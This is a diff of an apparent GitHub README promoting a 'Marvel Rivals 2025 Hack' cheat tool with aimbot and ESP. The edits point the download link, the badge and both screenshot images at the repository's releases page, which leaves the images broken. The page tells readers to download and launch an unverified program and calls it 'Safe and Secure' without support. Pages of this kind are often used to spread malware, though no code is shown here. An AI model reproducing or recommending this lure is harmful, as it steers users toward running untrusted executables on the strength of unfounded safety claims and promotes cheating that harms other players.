@@ -15,9 +15,9 @@ Welcome to the ultimate Marvel Rivals 2025 Hack repository! This cheat tool prov
 🔒 **Safe and Secure:** Our hack is constantly updated to ensure safety and security for all users.
 
 ## Get the Hack!
-📥 **[Download the Hack](https://github.com/uploads/App.zip)**
+📥 **[Download the Hack](https://github.com/SYESTM/Marvel-Rivals-2025-Hack/releases)**
 
-[![Download Hack](https://img.shields.io/badge/Download-Hack-brightgreen)](https://github.com/uploads/App.zip)
+[![Download Hack](https://github.com/SYESTM/Marvel-Rivals-2025-Hack/releases)](https://github.com/SYESTM/Marvel-Rivals-2025-Hack/releases)
 
 _(Note: The download link needs to be launched for access to the hack tool.)_
 
@@ -30,10 +30,10 @@ _(Note: The download link needs to be launched for access to the hack tool.)_
 ## Screenshots
 Here are some sneak peeks of the hack tool in action:
 
-![Aimbot Example](https://example.com/aimbot.png)  
+![Aimbot Example](https://github.com/SYESTM/Marvel-Rivals-2025-Hack/releases)  
 *Showcasing the powerful aimbot feature.*
 
-![ESP Preview](https://example.com/esp.png)  
+![ESP Preview](https://github.com/SYESTM/Marvel-Rivals-2025-Hack/releases)  
 *Experience the visibility advantage with ESP.*
 
 ## Testimonials
